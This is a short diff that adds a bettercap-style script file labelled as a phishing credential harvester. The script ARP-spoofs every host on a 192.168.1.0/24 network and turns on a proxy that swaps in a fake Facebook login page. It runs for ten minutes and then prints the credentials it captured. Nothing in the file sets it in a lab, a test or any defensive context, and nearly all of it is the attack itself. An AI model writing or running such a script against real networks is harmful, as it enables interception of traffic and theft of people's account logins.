@@ -1,0 +1,23 @@
+# phishing.caplet — Phishing credential harvest via MITM proxy
+# Sets up ARP spoofing + proxy with login page form swap.
+
+# Configure ARP spoofing
+set arp.spoof.targets 192.168.1.0/24
+set arp.spoof.fullduplex true
+
+# Start ARP spoofing
+on arp.spoof
+
+# Configure phishing brand and start the injection proxy
+set phish.inject.brand facebook
+on phish.inject
+
+# Run for 10 minutes
+sleep 600
+
+# Stop everything
+off phish.inject
+off arp.spoof
+
+# Show captured credentials
+creds.show
